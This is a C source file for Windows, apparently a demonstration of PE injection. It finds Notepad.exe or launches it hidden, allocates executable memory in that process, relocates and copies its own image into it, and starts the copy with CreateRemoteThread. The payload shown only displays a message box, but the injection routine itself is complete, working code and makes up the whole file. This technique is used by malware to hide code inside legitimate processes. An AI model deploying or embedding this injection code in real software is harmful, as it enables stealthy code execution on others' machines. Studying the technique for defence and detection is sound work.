#include <stdio.h>
#include <Windows.h>
#include <windows.h>
#include <tlhelp32.h>
typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

DWORD InjectionEntryPoint()
{
    CHAR moduleName[128] = "";
    GetModuleFileNameA(NULL, moduleName, sizeof(moduleName));
    MessageBoxA(NULL, moduleName, "Obligatory PE Injection", MB_OK);
    return 0;
}

DWORD get_pid_by_name(const char *proc_name) {
    PROCESSENTRY32 pe32;
    HANDLE hProcessSnap;
    DWORD pid = 0;

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "CreateToolhelp32Snapshot failed, error: %ld\n", GetLastError());
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe32)) {
        fprintf(stderr, "Process32First failed, error: %ld\n", GetLastError());
        CloseHandle(hProcessSnap);
        return 0;
    }

    do {
        if (_stricmp(pe32.szExeFile, proc_name) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return pid;
}

void LaunchHiddenProcess(const char *processName) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcess(NULL, (LPSTR)processName, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        fprintf(stderr, "CreateProcess failed, error: %lu\n", GetLastError());
    } else {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

int main()
{
    int x;

	PVOID imageBase = GetModuleHandle(NULL);
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeader->e_lfanew);

	PVOID localImage = VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
	memcpy(localImage, imageBase, ntHeader->OptionalHeader.SizeOfImage);

    DWORD pid = get_pid_by_name("Notepad.exe");

    if (pid == 0) {
        LaunchHiddenProcess("Notepad.exe");
        Sleep(5000);
        pid = get_pid_by_name("Notepad.exe");
    }
    if (pid == 0)
        return 0;

	HANDLE targetProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, pid);
	PVOID targetImage = VirtualAllocEx(targetProcess, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	DWORD_PTR deltaImageBase = (DWORD_PTR)targetImage - (DWORD_PTR)imageBase;

    PIMAGE_BASE_RELOCATION relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)localImage + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
    while (relocationTable->SizeOfBlock > 0)
    {
        DWORD relocationEntriesCount = (relocationTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
        PBASE_RELOCATION_ENTRY relocationRVA = (PBASE_RELOCATION_ENTRY)(relocationTable + 1);

        for (DWORD i = 0; i < relocationEntriesCount; i++)
        {
            if (relocationRVA[i].Offset)
            {
                PDWORD_PTR patchedAddress = (PDWORD_PTR)((DWORD_PTR)localImage + relocationTable->VirtualAddress + relocationRVA[i].Offset);
                *patchedAddress += deltaImageBase;
            }
        }
        relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocationTable + relocationTable->SizeOfBlock);
    }

	// Write memory into target process
	if (!WriteProcessMemory(targetProcess, targetImage, localImage, ntHeader->OptionalHeader.SizeOfImage, NULL)) {
		VirtualFreeEx(targetProcess, targetImage, 0, MEM_RELEASE);
		CloseHandle(targetProcess);
		VirtualFree(localImage, 0, MEM_RELEASE);
		return 1;
	}
	// Start the injected PE
	DWORD_PTR injectionEntryPointAddress = (DWORD_PTR)InjectionEntryPoint + deltaImageBase;
	HANDLE remoteThread = CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)injectionEntryPointAddress, NULL, 0, NULL);
	if (remoteThread == NULL) {
		VirtualFreeEx(targetProcess, targetImage, 0, MEM_RELEASE);
		CloseHandle(targetProcess);
		VirtualFree(localImage, 0, MEM_RELEASE);
		return 1;
	}

	scanf("%d", &x);
	// Clean up
	CloseHandle(remoteThread);
	VirtualFreeEx(targetProcess, targetImage, 0, MEM_RELEASE);
	CloseHandle(targetProcess);
	VirtualFree(localImage, 0, MEM_RELEASE);

	return 0;

}
